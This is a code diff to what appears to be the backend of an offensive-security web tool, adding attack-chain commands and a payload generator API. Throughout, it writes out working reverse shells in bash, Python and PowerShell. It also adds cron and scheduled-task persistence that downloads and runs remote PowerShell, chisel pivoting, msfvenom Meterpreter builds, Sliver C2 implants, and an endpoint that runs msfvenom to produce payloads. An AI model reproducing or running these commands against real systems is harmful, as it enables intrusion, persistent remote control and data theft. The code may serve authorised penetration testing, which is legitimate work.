@@ -83,8 +83,8 @@ class AttackChainEngine:
                 {
                     "id": 4, "name": "Establish Persistence",
                     "actions": [
-                        {"cmd": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/LHOST/4444 0>&1\"' | crontab -", "condition": "linux"},
-                        {"cmd": "schtasks /create /tn 'Update' /tr 'powershell -ep bypass -c IEX(...)' /sc minute", "condition": "windows"}
+                        {"cmd": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' | crontab -", "condition": "linux"},
+                        {"cmd": "schtasks /create /tn 'Update' /tr 'powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString(\"http://{lhost}:{lport}/shell.ps1\"))' /sc minute", "condition": "windows"}
                     ]
                 }
             ]
@@ -270,8 +270,8 @@ class AttackChainEngine:
                     "id": 4, "name": "Internal Recon & Pivot",
                     "actions": [
                         {"cmd": "arp -a; netstat -an; ipconfig /all"},
-                        {"tool": "chisel", "cmd": "chisel server -p 8080 --reverse (on attack box)"},
-                        {"cmd": "chisel client LHOST:8080 R:socks"}
+                        {"tool": "chisel", "cmd": "chisel server -p 8080 --reverse (on attack box: {lhost})"},
+                        {"cmd": "chisel client {lhost}:8080 R:socks"}
                     ]
                 }
             ]
@@ -1845,7 +1845,10 @@ async def get_chain_details(chain_id: str):
 @api_router.post("/chains/{chain_id}/generate")
 async def generate_chain_commands(chain_id: str, context: Dict[str, Any]):
     """Generate executable commands for a chain with context variables"""
-    commands = AttackChainEngine.generate_chain_commands(chain_id, context)
+    effective_lhost = context.get("lhost", "") or get_effective_lhost()
+    effective_lport = context.get("lport", "") or str(global_config.get("listener_port", 4444))
+    full_context = {"lhost": effective_lhost, "lport": effective_lport, **context, "lhost": effective_lhost, "lport": effective_lport}
+    commands = AttackChainEngine.generate_chain_commands(chain_id, full_context)
     if not commands:
         raise HTTPException(status_code=404, detail="Chain not found")
     return {"chain_id": chain_id, "commands": commands}
@@ -2163,6 +2166,215 @@ async def abort_scan(scan_id: str):
         scan_progress[scan_id]["progress"] = scan_progress[scan_id].get("progress", 0)
         return {"status": "aborted", "scan_id": scan_id}
     raise HTTPException(status_code=400, detail="Scan not running")
+
+# ============ PAYLOAD GENERATOR ============
+
+PAYLOAD_TEMPLATES = {
+    "windows/meterpreter/reverse_tcp": {
+        "name": "Windows Meterpreter Reverse TCP",
+        "platform": "windows",
+        "arch": "x64",
+        "type": "staged",
+        "generator": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}",
+        "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"",
+        "output_ext": "exe",
+        "description": "Staged Meterpreter. Requires handler listening. Full post-exploitation capabilities."
+    },
+    "windows/meterpreter/reverse_https": {
+        "name": "Windows Meterpreter Reverse HTTPS",
+        "platform": "windows",
+        "arch": "x64",
+        "type": "staged",
+        "generator": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f exe -o {output}",
+        "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"",
+        "output_ext": "exe",
+        "description": "Encrypted HTTPS channel. Evades basic network inspection. Requires SSL cert on handler."
+    },
+    "windows/shell_reverse_tcp": {
+        "name": "Windows Shell Reverse TCP",
+        "platform": "windows",
+        "arch": "x64",
+        "type": "stageless",
+        "generator": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}",
+        "handler": "nc -lvnp {lport}",
+        "output_ext": "exe",
+        "description": "Simple CMD shell. No Meterpreter features. Caught by nc/ncat listener."
+    },
+    "linux/shell_reverse_tcp": {
+        "name": "Linux Shell Reverse TCP",
+        "platform": "linux",
+        "arch": "x64",
+        "type": "stageless",
+        "generator": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}",
+        "handler": "nc -lvnp {lport}",
+        "output_ext": "elf",
+        "description": "ELF binary reverse shell. chmod +x required. Caught by nc listener."
+    },
+    "linux/meterpreter/reverse_tcp": {
+        "name": "Linux Meterpreter Reverse TCP",
+        "platform": "linux",
+        "arch": "x64",
+        "type": "staged",
+        "generator": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}",
+        "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit -j\"",
+        "output_ext": "elf",
+        "description": "Linux Meterpreter. Full post-exploitation. Requires MSF handler."
+    },
+    "php/reverse_php": {
+        "name": "PHP Reverse Shell",
+        "platform": "php",
+        "arch": "any",
+        "type": "stageless",
+        "generator": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o {output}",
+        "handler": "nc -lvnp {lport}",
+        "output_ext": "php",
+        "description": "PHP web shell for upload vulns. Caught by nc. Add <?php ?> tags if needed."
+    },
+    "bash_reverse": {
+        "name": "Bash One-Liner Reverse Shell",
+        "platform": "linux",
+        "arch": "any",
+        "type": "oneliner",
+        "generator": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "handler": "nc -lvnp {lport}",
+        "output_ext": None,
+        "description": "No binary needed. Execute directly on target. Requires /dev/tcp support."
+    },
+    "python_reverse": {
+        "name": "Python Reverse Shell",
+        "platform": "any",
+        "arch": "any",
+        "type": "oneliner",
+        "generator": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "handler": "nc -lvnp {lport}",
+        "output_ext": None,
+        "description": "Cross-platform. Requires python3 on target. No file drops."
+    },
+    "powershell_reverse": {
+        "name": "PowerShell Reverse Shell",
+        "platform": "windows",
+        "arch": "any",
+        "type": "oneliner",
+        "generator": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}\"",
+        "handler": "nc -lvnp {lport}",
+        "output_ext": None,
+        "description": "No binary drop. Runs in memory. May trigger AMSI/Defender."
+    },
+    "sliver_session": {
+        "name": "Sliver Session Implant",
+        "platform": "linux",
+        "arch": "amd64",
+        "type": "implant",
+        "generator": "sliver > generate --mtls {lhost}:{lport} --os {platform} --arch {arch} --save {output}",
+        "handler": "sliver > mtls --lhost {lhost} --lport {lport}",
+        "output_ext": "elf",
+        "description": "Sliver C2 implant. Encrypted mTLS. Session-based. Use Sliver console."
+    },
+    "sliver_beacon": {
+        "name": "Sliver Beacon Implant",
+        "platform": "linux",
+        "arch": "amd64",
+        "type": "implant",
+        "generator": "sliver > generate beacon --mtls {lhost}:{lport} --os {platform} --arch {arch} --seconds 60 --jitter 30 --save {output}",
+        "handler": "sliver > mtls --lhost {lhost} --lport {lport}",
+        "output_ext": "elf",
+        "description": "Sliver C2 beacon. Async check-in every 60s. Stealthier than sessions."
+    },
+}
+
+@api_router.get("/payloads/templates")
+async def get_payload_templates():
+    """List all available payload templates with LHOST/LPORT pre-filled"""
+    lhost = get_effective_lhost()
+    lport = str(global_config.get("listener_port", 4444))
+    templates = []
+    for pid, pt in PAYLOAD_TEMPLATES.items():
+        templates.append({
+            "id": pid,
+            "name": pt["name"],
+            "platform": pt["platform"],
+            "arch": pt["arch"],
+            "type": pt["type"],
+            "description": pt["description"],
+            "generator_cmd": pt["generator"].format(lhost=lhost or "YOUR_IP", lport=lport, output=f"payload.{pt['output_ext'] or 'txt'}", platform=pt["platform"], arch=pt["arch"]),
+            "handler_cmd": pt["handler"].format(lhost=lhost or "YOUR_IP", lport=lport),
+            "lhost_configured": bool(lhost),
+        })
+    return {"payloads": templates, "global_lhost": lhost, "global_lport": lport}
+
+@api_router.post("/payloads/generate")
+async def generate_payload(data: Dict[str, Any]):
+    """Generate a real payload using msfvenom or return the exact command to run"""
+    payload_id = data.get("payload_id", "")
+    template = PAYLOAD_TEMPLATES.get(payload_id)
+    if not template:
+        raise HTTPException(status_code=404, detail=f"Unknown payload: {payload_id}")
+    
+    lhost = data.get("lhost") or get_effective_lhost()
+    lport = str(data.get("lport") or global_config.get("listener_port", 4444))
+    platform = data.get("platform", template["platform"])
+    arch = data.get("arch", template["arch"])
+    output_name = data.get("output", f"payload_{payload_id.replace('/', '_')}.{template['output_ext'] or 'txt'}")
+    
+    if not lhost:
+        raise HTTPException(status_code=400, detail="LHOST not configured. Set it in Config > Listener IP first.")
+    
+    generator_cmd = template["generator"].format(lhost=lhost, lport=lport, output=output_name, platform=platform, arch=arch)
+    handler_cmd = template["handler"].format(lhost=lhost, lport=lport)
+    
+    result = {
+        "payload_id": payload_id,
+        "name": template["name"],
+        "type": template["type"],
+        "platform": platform,
+        "arch": arch,
+        "lhost": lhost,
+        "lport": lport,
+        "generator_cmd": generator_cmd,
+        "handler_cmd": handler_cmd,
+        "output_file": output_name if template["output_ext"] else None,
+        "description": template["description"],
+    }
+    
+    # For oneliners, the generator IS the payload - no file needed
+    if template["type"] == "oneliner":
+        result["payload_content"] = generator_cmd
+        result["execution_method"] = "Copy and paste directly on target"
+        return result
+    
+    # For binary payloads, try to generate with msfvenom if available
+    if template["type"] in ("staged", "stageless"):
+        try:
+            output_path = f"/tmp/{output_name}"
+            gen_result = subprocess.run(
+                generator_cmd.split(),
+                capture_output=True, text=True, timeout=120
+            )
+            if gen_result.returncode == 0 and os.path.exists(output_path):
+                file_size = os.path.getsize(output_path)
+                result["generated"] = True
+                result["file_path"] = output_path
+                result["file_size"] = file_size
+                result["execution_method"] = f"Transfer {output_name} to target and execute. Start handler first: {handler_cmd}"
+            else:
+                result["generated"] = False
+                result["error"] = gen_result.stderr[:300] if gen_result.stderr else "Generation failed"
+                result["execution_method"] = f"Run manually on your Kali: {generator_cmd}"
+        except FileNotFoundError:
+            result["generated"] = False
+            result["error"] = "msfvenom not found (run on Kali Linux)"
+            result["execution_method"] = f"Run on your Kali: {generator_cmd}"
+        except Exception as e:
+            result["generated"] = False
+            result["error"] = str(e)
+            result["execution_method"] = f"Run on your Kali: {generator_cmd}"
+    elif template["type"] == "implant":
+        result["generated"] = False
+        result["execution_method"] = f"Run in Sliver console: {generator_cmd}"
+    
+    return result
+
+
 
 # ============ DYNAMIC TOOL CATALOG (Point 6) ============
 
